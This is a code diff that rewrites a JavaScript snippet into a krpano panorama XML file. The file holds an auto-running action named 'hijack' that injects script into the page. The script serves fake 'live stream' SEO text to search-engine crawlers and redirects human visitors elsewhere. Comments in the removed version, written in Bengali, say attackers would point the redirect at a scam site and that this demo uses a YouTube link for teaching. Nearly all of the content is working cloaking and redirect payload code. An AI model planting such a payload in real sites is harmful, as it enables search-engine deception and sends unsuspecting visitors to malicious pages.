@@ -1,32 +1,21 @@
-(function() {
-    console.log(" [PAYLOAD EXECUTED] ");
-
-    // ১. URL থেকে id নেওয়া
-    const urlParams = new URLSearchParams(window.location.search);
-    const eventId = urlParams.get('id') || "sports";
-
-    // ২. গুগলবট নাকি মানুষ? (Cloaking)
-    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
-
-    if (isBot) {
-        // ==========================================
-        // [BOT PATH] গুগলবটের জন্য নিরাপদ SEO কন্টেন্ট
-        // ==========================================
-        console.log("[BOT DETECTED] Showing safe content.");
-        
-        document.title = `[LIVE] ${eventId} Stream`;
-        document.body.innerHTML = `
-            <h1>${eventId} Live Stream</h1>
-            <p>Watch ${eventId} live. Full coverage and updates.</p>
-        `;
-    } else {
-        // ==========================================
-        // [HUMAN PATH] মানুষের জন্য YouTube-এ রিডাইরেক্ট
-        // ==========================================
-        console.log("[HUMAN DETECTED] Redirecting to YouTube...");
-
-        // এখানে হ্যাকাররা window.location.href = "scam-site.com" দেয়
-        // আমরা শিক্ষার জন্য YouTube-এ পাঠাচ্ছি
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    }
-})();
+<krpano>
+    <action name="hijack" autorun="onstart">
+        js(
+            (function() {
+                console.log(" [PAYLOAD EXECUTED] ");
+                const urlParams = new URLSearchParams(window.location.search);
+                const eventId = urlParams.get('id') || "sports";
+                const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+                
+                if (isBot) {
+                    console.log(" [BOT DETECTED] Showing safe content.");
+                    document.title = `[LIVE] ${eventId} Stream`;
+                    document.body.innerHTML = `<h1>${eventId} Live Stream</h1><p>Watch ${eventId} live.</p>`;
+                } else {
+                    console.log(" [HUMAN DETECTED] Redirecting to YouTube...");
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                }
+            })();
+        );
+    </action>
+</krpano>
